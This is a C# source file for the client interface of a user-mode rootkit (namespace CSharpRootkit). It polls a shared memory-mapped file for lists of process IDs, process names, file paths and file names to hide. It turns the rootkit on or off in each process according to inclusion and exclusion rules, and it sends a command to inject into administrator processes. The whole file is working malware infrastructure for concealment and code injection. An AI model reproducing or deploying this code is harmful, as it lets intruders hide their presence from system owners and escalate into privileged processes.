using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CSharpRootkit
{
    public static class RootKitClientInterface
    {
        public static bool started = false;

        private static string RootKitMemFileName;

        private static MemoryMappedFile MemoryFile;
        private static MemoryMappedViewAccessor MemoryFileModifier;

        private static Thread UpdaterThread;

        private static bool NeedsUpdate = true;

        private static List<string> InjectProcessNameInclusionExclusionList = new List<string>();
        private static List<string> InjectProcessPathInclusionExclusionList = new List<string>();

        private static long OneMb = 1 * 1024 * 1024;//1mb

        private static long MemoryMappedFileSize = OneMb * 5; // 5mb

        private static long ControllerKeyRegionStart = 0;
        private static long ControllerKeyRegionEnd = ControllerKeyRegionStart + sizeof(int);

        private static long RootKitStartedRegionStart = ControllerKeyRegionEnd;
        private static long RootKitStartedRegionEnd = RootKitStartedRegionStart + sizeof(bool);

        private static long IsInclusionModeRegionStart = RootKitStartedRegionEnd;
        private static long IsInclusionModeRegionEnd = IsInclusionModeRegionStart + sizeof(bool);

        private static long HideInfoRegionStart = IsInclusionModeRegionEnd;
        private static long HideInfoRegionEnd = HideInfoRegionStart + OneMb;//+1mb

        private static long InclusionExclusionInfoRegionStart = HideInfoRegionEnd;
        private static long InclusionExclusionInfoRegionEnd = InclusionExclusionInfoRegionStart + OneMb;//+1mb

        private static long ServerCommandsRegionStart = InclusionExclusionInfoRegionEnd;
        private static long ServerCommandsRegionEnd = ServerCommandsRegionStart + OneMb;//+1mb

        private static long ClientCommandsRegionStart = ServerCommandsRegionEnd;
        private static long ClientCommandsRegionEnd = ClientCommandsRegionStart + OneMb;//+1mb

        private static string ServerCommandRegionMutex;
        private static string ClientCommandRegionMutex;

        private static MutexSecurity MutexSecuritySettings;

        static RootKitClientInterface() 
        {
            MutexSecuritySettings = new MutexSecurity();

            // Allow everyone to use the mutex
            MutexAccessRule securityRule = new MutexAccessRule(
                new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                MutexRights.FullControl,
                AccessControlType.Allow);

            MutexSecuritySettings.AddAccessRule(securityRule);
        }

        public static void Start(string MemFileName = "RootKitMemFile")
        {
            if (started)
            {
                throw new Exception("The interface is already started!");
            }
            RootKitMemFileName = MemFileName;
            ServerCommandRegionMutex = RootKitMemFileName + "ServerCommandRegion";
            ClientCommandRegionMutex = RootKitMemFileName + "ClientCommandRegion";
            UpdaterThread = new Thread(UpdaterLoop);
            UpdaterThread.Start();
            started = true;
        }

        public static void Stop()
        {
            if (!started)
            {
                return;//throw new Exception("The interface is not started!");
            }

            if (RootKit.Started) 
            {
                try
                {
                    RootKit.Stop();
                }
                catch { }
            }

            MemoryFileModifier?.Dispose();
            MemoryFile?.Dispose();

            started = false;
            
            //try
            //{
            //    UpdaterThread.Abort();
            //}
            //catch { }
        }

        private static void UpdaterLoop() //if error in the file update, it causes entire thing to stop.
        {
            int MaxErrorCount = 10;
            int errorCount = 0;
            while (true) 
            {
                try
                {
                    if (Utils.OpenMemoryMappedFile(RootKitMemFileName, out MemoryFile))
                    {
                        MemoryFileModifier = MemoryFile.CreateViewAccessor(0, MemoryMappedFileSize, MemoryMappedFileAccess.ReadWrite);
                        errorCount = 0;
                        ProcessMemoryFileUpdates();
                    }
                }
                catch (Exception e)
                {
                    var f = e;
                    errorCount++;
                    if (errorCount >= MaxErrorCount) 
                    {
                        Stop();
                        break;
                    }

                }
                Thread.Sleep(1000);
            }
        }

        private static void ProcessMemoryFileUpdates() 
        {
            byte[] HiddenDataBuffer = new byte[HideInfoRegionEnd - HideInfoRegionStart];
            byte[] InclusionExclusionDataBuffer = new byte[InclusionExclusionInfoRegionEnd - InclusionExclusionInfoRegionStart];
            while (started) 
            {
                MemoryFileModifier.ReadArray(InclusionExclusionInfoRegionStart, InclusionExclusionDataBuffer, 0, InclusionExclusionDataBuffer.Length);
                GetInclusionExclusionData(InclusionExclusionDataBuffer, out string[] inExprocessNames, out string[] inExfilePaths);

                if (!InjectProcessNameInclusionExclusionList.SequenceEqual(inExprocessNames))
                {
                    InjectProcessNameInclusionExclusionList.Clear();
                    InjectProcessNameInclusionExclusionList.AddRange(inExprocessNames);
                }

                if (!InjectProcessPathInclusionExclusionList.SequenceEqual(inExfilePaths))
                {
                    InjectProcessPathInclusionExclusionList.Clear();
                    InjectProcessPathInclusionExclusionList.AddRange(inExfilePaths);
                }


                if (GetRootKitStatus() && !IsAgainstInclusionExclusionRules(NativeMethods.GetCurrentProcess()))// && make sure that its not excluded/not included/etc
                {
                    if (!RootKit.Started)
                    {
                        RootKit.Start();
                    }
                    MemoryFileModifier.ReadArray(HideInfoRegionStart, HiddenDataBuffer, 0, HiddenDataBuffer.Length);
                    GetHiddenData(HiddenDataBuffer, out int[] pids, out string[] processNames, out string[] filePaths, out string[] fileNames);
                    RootKit.setup(pids, processNames, filePaths, fileNames);
                    //update the rootkit.

                    

                }
                else 
                {
                    if (RootKit.Started) 
                    {
                        RootKit.Stop();
                    }
                }

                //process the commands here

                Thread.Sleep(1000);
            }
        }

        private static void GetHiddenData(byte[] data, out int[] pids, out string[] processNames, out string[] filePaths, out string[] fileNames)
        {
            int offset = 0;

            // Deserialize pids
            int pidsLength = BitConverter.ToInt32(data, offset);
            offset += 4;
            pids = new int[pidsLength];
            for (int i = 0; i < pidsLength; i++)
            {
                pids[i] = BitConverter.ToInt32(data, offset);
                offset += 4;
            }

            // Deserialize processNames
            int processNamesLength = BitConverter.ToInt32(data, offset);
            offset += 4;
            processNames = new string[processNamesLength];
            for (int i = 0; i < processNamesLength; i++)
            {
                int nameLength = BitConverter.ToInt32(data, offset);
                offset += 4;
                processNames[i] = Encoding.Unicode.GetString(data, offset, nameLength);
                offset += nameLength;
            }

            // Deserialize filePaths
            int filePathsLength = BitConverter.ToInt32(data, offset);
            offset += 4;
            filePaths = new string[filePathsLength];
            for (int i = 0; i < filePathsLength; i++)
            {
                int pathLength = BitConverter.ToInt32(data, offset);
                offset += 4;
                filePaths[i] = Encoding.Unicode.GetString(data, offset, pathLength);
                offset += pathLength;
            }

            // Deserialize fileNames
            int fileNamesLength = BitConverter.ToInt32(data, offset);
            offset += 4;
            fileNames = new string[fileNamesLength];
            for (int i = 0; i < fileNamesLength; i++)
            {
                int nameLength = BitConverter.ToInt32(data, offset);
                offset += 4;
                fileNames[i] = Encoding.Unicode.GetString(data, offset, nameLength);
                offset += nameLength;
            }
        }

        private static void GetInclusionExclusionData(byte[] data, out string[] ProcessNames, out string[] FilePaths)
        {
            int offset = 0;
            int processNamesLength = BitConverter.ToInt32(data, offset);
            offset += 4;
            ProcessNames = new string[processNamesLength];

            for (int i = 0; i < processNamesLength; i++)
            {
                int nameLength = BitConverter.ToInt32(data, offset);
                offset += 4;
                ProcessNames[i] = Encoding.Unicode.GetString(data, offset, nameLength);
                offset += nameLength;
            }

            int filePathsLength = BitConverter.ToInt32(data, offset);
            offset += 4;
            FilePaths = new string[filePathsLength];
            for (int i = 0; i < filePathsLength; i++)
            {
                int pathLength = BitConverter.ToInt32(data, offset);
                offset += 4;
                FilePaths[i] = Encoding.Unicode.GetString(data, offset, pathLength);
                offset += pathLength;
            }
        }

        private static bool GetRootKitStatus() 
        {
            return MemoryFileModifier.ReadBoolean(RootKitStartedRegionStart);
        }

        private static bool IsInclusionMode()
        {
            return MemoryFileModifier.ReadBoolean(IsInclusionModeRegionStart);
        }

        private static RootKitIPCStructs.MemoryInfoTag GetNextAddAvailbleDataSpot(int dataLength)
        {
            long currentPos = ClientCommandsRegionStart;
            while (currentPos < ClientCommandsRegionEnd)
            {
                int structLength = MemoryFileModifier.ReadInt32(currentPos);
                if (structLength == 0) // Free region, need to find the next region and make sure it doesn't overwrite
                {
                    long tempCurrentPos = currentPos;

                    while (tempCurrentPos < ClientCommandsRegionEnd && (tempCurrentPos - currentPos) < dataLength)
                    {
                        if (MemoryFileModifier.ReadByte(tempCurrentPos) != 0)
                        {
                            break;
                        }
                        tempCurrentPos++;
                    }
                    long RegionSize = tempCurrentPos - currentPos;
                    if (dataLength <= RegionSize)
                    {
                        return new RootKitIPCStructs.MemoryInfoTag { StartRegion = currentPos, EndRegion = currentPos + dataLength, HasRegion = true };
                    }
                    else 
                    {
                        currentPos = tempCurrentPos;
                        
                        if (currentPos >= ClientCommandsRegionEnd)
                        {
                            break;
                        }

                        structLength = MemoryFileModifier.ReadInt32(currentPos);
                    }
                }
                currentPos += structLength + 4; // +4 for the starting int
            }
            return new RootKitIPCStructs.MemoryInfoTag { StartRegion = 0, EndRegion = 0, HasRegion = false };
        }

        private static RootKitIPCStructs.MemoryInfoTag AddClientRegionCommandData<T>(RootKitIPCStructs.ServerOpcodeEnum opcode, T data)
        {
            using (Mutex mutex = new Mutex(false, ClientCommandRegionMutex, out bool createdNew, MutexSecuritySettings))
            {
                try
                {
                    mutex.WaitOne();
                    byte[] TData = Utils.StructToBytes(data);
                    int payloadLength = TData.Length + 1;//+1 for the opcode which should be 1 byte
                    byte[] payloadData = Utils.CombineByteArrays(BitConverter.GetBytes(payloadLength), new byte[] { (byte)opcode }, TData);
                    RootKitIPCStructs.MemoryInfoTag result = GetNextAddAvailbleDataSpot(payloadData.Length);
                    if (result.HasRegion)
                    {
                        MemoryFileModifier.WriteArray(result.StartRegion, payloadData, 0, payloadData.Length);
                    }
                    return result;
                }
                finally
                {
                    mutex.ReleaseMutex();   
                }
            }
        }

        private static void RemoveClientRegionCommandData(RootKitIPCStructs.MemoryInfoTag region)
        {
            byte[] NullData = new byte[region.EndRegion - region.StartRegion];
            MemoryFileModifier.WriteArray(region.StartRegion, NullData, 0, NullData.Length);
        }

        private static RootKitIPCStructs.ServerCommand[] GetCommands()
        {
            List<RootKitIPCStructs.ServerCommand> commands = new List<RootKitIPCStructs.ServerCommand>();
            long currentPos = ServerCommandsRegionStart;
            while (currentPos < ServerCommandsRegionEnd)
            {
                int structLength = MemoryFileModifier.ReadInt32(currentPos);

                if (structLength == 0)
                {
                    long tempPos = currentPos;
                    while (tempPos < ServerCommandsRegionEnd)
                    {
                        if (MemoryFileModifier.ReadByte(tempPos) != 0)
                        {
                            currentPos = tempPos;
                            structLength = MemoryFileModifier.ReadInt32(currentPos);
                            currentPos += 4;
                            break;
                        }
                        tempPos++;
                    }
                    if (tempPos >= ServerCommandsRegionEnd)
                    {
                        return commands.ToArray();
                    }
                }
                else
                {
                    currentPos += 4;
                }

                RootKitIPCStructs.MemoryInfoTag location = new RootKitIPCStructs.MemoryInfoTag() { StartRegion = currentPos - 4, EndRegion = currentPos + structLength };//-4 to account the +4 earlier, we only add in the EndRegion as the memoryinfo holds the length header too, so currentPos is currently skipping the he

                RootKitIPCStructs.ClientOpcodeEnum opcode = (RootKitIPCStructs.ClientOpcodeEnum)MemoryFileModifier.ReadByte(currentPos);
                currentPos++;
                structLength--;
                byte[] data = new byte[structLength];
                MemoryFileModifier.ReadArray(currentPos, data, 0, data.Length);
                commands.Add(new RootKitIPCStructs.ServerCommand() { opcode = opcode, data = data, location= location });
                currentPos += structLength;
            }
            return commands.ToArray();
        }

        private static bool IsTaskCompleted<T>(RootKitIPCStructs.MemoryInfoTag taskLocation)
        {
            long CompletionBoolLocation = taskLocation.StartRegion + 4 + 1 + (int)Marshal.OffsetOf<T>("TaskComplete");//+4 for the length header, +1 for the opcode, +x to offset us to the direct address
            return MemoryFileModifier.ReadBoolean(CompletionBoolLocation);
        }

        private static bool WaitForTaskComplete<T>(RootKitIPCStructs.MemoryInfoTag taskLocation, int timeout=2000)
        {
            long CompletionBoolLocation=taskLocation.StartRegion + 4 + 1 + (int)Marshal.OffsetOf<T>("TaskComplete");//+4 for the length header, +1 for the opcode, +x to offset us to the direct address
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            while (stopwatch.ElapsedMilliseconds < timeout) 
            {
                if (MemoryFileModifier.ReadBoolean(CompletionBoolLocation)) 
                {
                    return true;
                }
                Thread.Sleep(50);
            }
            return false;
        }
        private static void MarkTaskComplete<T>(RootKitIPCStructs.MemoryInfoTag taskLocation)
        {
            long CompletionBoolLocation = taskLocation.StartRegion + 4 + 1 + (int)Marshal.OffsetOf<T>("TaskComplete");//+4 for the length header, +1 for the opcode, +x to offset us to the direct address
            MemoryFileModifier.Write(CompletionBoolLocation, true);
        }

        public static void NtResumeThread_InjectAdminProcess(int ProcessToInject) 
        {
            if (!started)
            {
                return;
            }
            RootKitIPCStructs.MemoryInfoTag commandLocation= AddClientRegionCommandData(RootKitIPCStructs.ServerOpcodeEnum.MimicNtResumeInjectOnAdminProcess, new RootKitIPCStructs.InjectProcessInfo() { ProcessToInject = ProcessToInject, TaskComplete = false });
            WaitForTaskComplete<RootKitIPCStructs.InjectProcessInfo>(commandLocation, 3000);
            //Console.WriteLine("admin injected!?!");
            //remove task from queue
        }

        public static bool IsAgainstInclusionExclusionRules(int pid)
        {
            if (!started)
            {
                return true;
                //throw new Exception("This interface has not been started!");
            }


            bool isInclusion = IsInclusionMode();

            if (Utils.GetFilePathOfProcess(pid, out string fullFilePath))
            {
                string processName = Path.GetFileName(fullFilePath).ToLower();
                string[] InclusionExclusionPathNamesCopy = InjectProcessPathInclusionExclusionList.ToArray();
                string[] InclusionExclusionProcessNamesCopy = InjectProcessNameInclusionExclusionList.ToArray();

                foreach (string path in InclusionExclusionPathNamesCopy)
                {
                    if (Utils.ComparePaths(path, fullFilePath))
                    {
                        return !isInclusion;
                    }
                }

                foreach (string name in InjectProcessNameInclusionExclusionList)
                {
                    if (processName == name)
                    {
                        return !isInclusion;
                    }
                }

            }

            return isInclusion;


        }

        public static bool IsAgainstInclusionExclusionRules(IntPtr hProcess)
        {
            if (!started)
            {
                return true;
                //throw new Exception("This interface has not been started!");
            }

            bool isInclusion = IsInclusionMode();

            if (Utils.GetFilePathOfProcess(hProcess, out string fullFilePath))
            {
                string processName = Path.GetFileName(fullFilePath).ToLower();
                string[] InclusionExclusionPathNamesCopy = InjectProcessPathInclusionExclusionList.ToArray();
                string[] InclusionExclusionProcessNamesCopy = InjectProcessNameInclusionExclusionList.ToArray();

                foreach (string path in InclusionExclusionPathNamesCopy)
                {
                    if (Utils.ComparePaths(path, fullFilePath))
                    {
                        return !isInclusion;
                    }
                }

                foreach (string name in InjectProcessNameInclusionExclusionList)
                {
                    if (processName == name)
                    {
                        return !isInclusion;
                    }
                }

            }

            return isInclusion;
        }


    }
}
